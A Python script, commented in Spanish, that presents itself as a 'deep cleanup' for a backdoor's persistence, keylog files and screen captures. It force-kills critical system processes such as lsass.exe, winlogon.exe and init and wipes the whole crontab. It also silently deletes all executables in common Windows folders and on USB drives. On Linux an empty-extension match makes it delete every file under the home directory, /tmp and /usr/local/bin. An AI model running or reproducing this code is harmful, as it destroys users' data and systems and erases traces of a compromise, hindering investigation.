import os
import sys
import subprocess
import shutil
import platform
import glob
import getpass
import time

NOMBRES_FAKE = [
    "svchost.exe", "lsass.exe", "explorer.exe", "winlogon.exe", "services.exe",
    "systemd", "init", "bash", "python3", "pulseaudio"
]
USUARIOS = [getpass.getuser(), "Administrator", "admin", "user", "root"]

def kill_processes():
    # Mata procesos sospechosos por nombre
    for nombre in NOMBRES_FAKE:
        if os.name == "nt":
            os.system(f"taskkill /F /IM {nombre} >nul 2>&1")
        else:
            os.system(f"pkill -f {nombre}")

def limpiar_startup_win():
    # Borra entradas de registro de autoarranque
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        regpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, regpath, 0, winreg.KEY_ALL_ACCESS) as reg:
            for val in ["SysDrv", "sysdrv", "svchost", "explorer"]:
                try:
                    winreg.DeleteValue(reg, val)
                except:
                    pass
    except:
        pass
    # Borra de carpeta Startup
    startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    if os.path.exists(startup):
        for f in os.listdir(startup):
            if f.lower().startswith(("sysdrv", "svchost", "explorer")) or f.endswith(".lnk"):
                try:
                    os.remove(os.path.join(startup, f))
                except:
                    pass

def limpiar_crontab_linux():
    try:
        os.system("crontab -r")
    except:
        pass

def limpiar_autostart_linux():
    autostart = os.path.expanduser("~/.config/autostart/")
    if os.path.exists(autostart):
        for f in os.listdir(autostart):
            if "SysDrv" in f or f.endswith(".desktop"):
                try:
                    os.remove(os.path.join(autostart, f))
                except:
                    pass

def quitar_proteccion(path):
    try:
        if os.name == "nt":
            os.system(f'attrib -h -s -r "{path}"')
        else:
            subprocess.run(["chattr", "-i", path], stderr=subprocess.DEVNULL)
            os.chmod(path, 0o700)
    except:
        pass

def limpiar_rutas_persistencia():
    # Limpia todas las posibles rutas de copia persistente
    rutas = []
    if os.name == "nt":
        appdata = os.path.expandvars(r"%APPDATA%")
        rutas += [
            appdata, 
            os.path.join(appdata, "Microsoft\\Windows"),
            os.path.join(appdata, "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
            r"C:\ProgramData",
            r"C:\Windows\Temp"
        ]
        extensiones = [".exe", ".bat", ".dll"]
    else:
        home = os.path.expanduser("~")
        rutas += [
            os.path.join(home, ".config"),
            os.path.join(home, ".local", "bin"),
            "/usr/local/bin",
            "/tmp",
            home,
        ]
        extensiones = ["", ".sh", ".bin"]
    for ruta in rutas:
        if os.path.exists(ruta):
            for root, dirs, files in os.walk(ruta):
                for f in files:
                    if any(f.startswith(pref) for pref in ["sysdrv", "svchost", "explorer", "backdoors", ".sysdrv"]) \
                        or any(f.endswith(ext) for ext in extensiones):
                        try:
                            full_path = os.path.join(root, f)
                            quitar_proteccion(full_path)
                            os.remove(full_path)
                        except:
                            pass

def limpiar_logs_y_temporales():
    patrones = [
        os.path.expanduser("~/.keylog_backdoors.txt"),
        os.path.expanduser("~/screengrab_*.png"),
        os.path.expanduser("~/backdoors_activity.log"),
        os.path.expanduser("~/BackDoors_1.1_Reports/"),
        "/tmp/bd_*", "/tmp/keylog*", "/tmp/screencap*"
    ]
    for patron in patrones:
        for path in glob.glob(patron):
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
            except:
                pass

def limpiar_usb():
    if os.name == "nt":
        from string import ascii_uppercase
        for letter in ascii_uppercase:
            path = f"{letter}:\\"
            if os.path.exists(path):
                for f in os.listdir(path):
                    if f.lower().startswith(("sysdrv", "svchost", "explorer")) or f.endswith((".exe", ".bat", ".desktop")):
                        try:
                            os.remove(os.path.join(path, f))
                        except:
                            pass
    else:
        for base in ["/media", "/run/media", "/mnt"]:
            if os.path.exists(base):
                for sub in os.listdir(base):
                    usb_path = os.path.join(base, sub)
                    if os.path.ismount(usb_path):
                        for f in os.listdir(usb_path):
                            if f.startswith(("sysdrv", "svchost", "explorer", ".sysdrv")):
                                try:
                                    os.remove(os.path.join(usb_path, f))
                                except:
                                    pass

def main():
    print("==== INICIANDO LIMPIEZA PROFUNDA ====")
    kill_processes()
    if os.name == "nt":
        limpiar_startup_win()
    else:
        limpiar_crontab_linux()
        limpiar_autostart_linux()
    limpiar_rutas_persistencia()
    limpiar_logs_y_temporales()
    limpiar_usb()
    print("==== LIMPIEZA FINALIZADA ====")

if __name__ == "__main__":
    main()
